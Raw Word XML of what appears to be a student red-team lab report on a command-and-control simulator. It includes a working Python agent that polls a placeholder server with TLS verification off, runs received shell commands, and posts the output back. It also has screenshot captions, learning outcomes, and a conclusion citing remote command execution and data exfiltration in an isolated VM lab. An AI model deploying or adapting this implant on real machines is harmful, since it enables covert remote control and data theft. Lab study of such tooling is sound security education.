          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        if cmd == "exit":</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            break</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    run_server()</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C12B8BE" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Agent (agent.py)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754659D7" w14:textId="77777777" w:rsidR="00A62571" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>import subprocess</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>import time</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>import json</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>SERVER_URL = "https://&lt;your_server_ip&gt;:4443"</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>def get_command():</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        response = requests.get(SERVER_URL, verify=False)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        command = json.loads(response.text)['cmd']</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return command</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        print("[-] Error fetching command:", e)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return ""</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>def send_response(output):</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        requests.post(SERVER_URL, json={'output': output}, verify=False)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        print("[-] Error sending response:", e)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>def execute_command(command):</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return output.decode()</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return str(e)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    while True:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        cmd = get_command()</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        if cmd:</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            if cmd.lower() == "exit":</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                break</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">            result = execute_command(cmd)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            send_response(result)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        time.sleep(5)</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6352B6B5" w14:textId="77777777" w:rsidR="00860773" w:rsidRDefault="00860773">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41E4A63D" w14:textId="77777777" w:rsidR="00860773" w:rsidRDefault="00860773">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B39E905" w14:textId="77777777" w:rsidR="00860773" w:rsidRPr="005E5517" w:rsidRDefault="00860773">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26F18105" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Screenshots</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6741BEA4" w14:textId="603B77C3" w:rsidR="00860773" w:rsidRPr="00860773" w:rsidRDefault="00000000" w:rsidP="00860773">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>C2 Server running and waiting for agent.</w:t>
      </w:r>
      <w:r w:rsidR="00860773" w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00860773" w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00860773" w:rsidRPr="00860773">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="193C583E" wp14:editId="5468F040">
            <wp:extent cx="5486400" cy="3893185"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="10538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1651" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="3893185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00860773" w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EF76A8" w14:textId="17AD1D17" w:rsidR="00A62571" w:rsidRPr="00860773" w:rsidRDefault="00860773" w:rsidP="00860773">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2. Agent terminal showing polling and command execution.</w:t>
      </w:r>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="754317C7" wp14:editId="54B07624">
            <wp:extent cx="5486400" cy="2085340"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="77495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9961" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2085340"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00860773">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A7DCB5" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Security Mechanisms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCABEC8" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>All communication is encrypted using TLS with self-signed certificates. Data is encoded using Base64 to ensure safe transmission. Lab is fully isolated and uses host-only networking for safe testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1905CCE2" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Learning Outcomes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E91C5DB" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>• Understood red team operation methods and attack simulation.</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>• Learned secure data transmission using SSL and encryption.</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>• Implemented automation scripts using Python.</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>• Improved knowledge of virtualization and Linux system management.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09602E8A" w14:textId="77777777" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E61EA7" w14:textId="23439313" w:rsidR="00A62571" w:rsidRPr="005E5517" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">This Command and Control simulator project effectively demonstrates essential cybersecurity operations such as </w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>remote command execution, data exfiltration, and secure communication. The use of virtual machines ensures complete safety and isolation of experiment</w:t>
      </w:r>
      <w:r w:rsidR="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="005E5517">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00A62571" w:rsidRPr="005E5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9E3F5D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3808E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B10823"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A4BC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274141">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1382514633">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1870333504">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="298850255">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="418793733">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1686177270">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1158691079">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1584953219">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="937561670">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="134180489">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="780497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03D"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="002428D4"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="005E5517"/>
    <w:rsid w:val="006C0BD4"/>
    <w:rsid w:val="00860773"/>
    <w:rsid w:val="009B2607"/>
    <w:rsid w:val="00A62571"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D00657"/>
    <w:rsid w:val="00EC7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3C6DBE"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{FCD16659-644F-488F-A43D-91E12D71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E5517"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="005E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60363">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="259293055">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1425105264">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1660039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686</Words>
  <Characters>4985</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>207</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Jayanti Mandal</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-08-29T17:07:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-29T17:09:00Z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ae02b31c-7315-42c5-935d-ef9a5c950f1a</vt:lpwstr>
  </property>
</Properties>
</file>